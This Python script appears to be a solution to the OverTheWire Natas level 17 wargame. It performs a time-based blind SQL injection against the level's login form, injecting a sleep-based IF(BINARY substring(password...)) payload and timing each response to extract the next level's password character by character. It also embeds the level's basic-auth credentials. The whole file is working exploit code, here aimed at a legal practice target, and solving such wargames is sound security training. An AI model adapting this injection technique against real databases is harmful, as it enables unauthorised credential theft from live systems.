import requests
import string
from requests.auth import HTTPBasicAuth

ValidChars = string.digits + string.ascii_letters
PASSWORD_LEN = 32

password=''
count =1

username = "natas18"

auth = HTTPBasicAuth('natas17', 'wherethepassword')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

url = "http://natas17.natas.labs.overthewire.org/index.php"

while count < PASSWORD_LEN +1:
    for c in ValidChars:
        payload=f"username={username}" + \
                "\" AND " + \
                "IF(BINARY substring(password,1," + str(count) + ")" + \
                " = '" + password + c + "',sleep(5),False)" + \
                " -- "
        
        while True:
            try:
                response=requests.post(url, data=payload, headers=headers, auth=auth, verify=False)
                break
            except:
                continue
            
        if response.elapsed.total_seconds() > 4 and response.elapsed.total_seconds() < 7:
            print("Char has been found: " + c)
            password+=c
            count = count+1

print("The password is: " + password)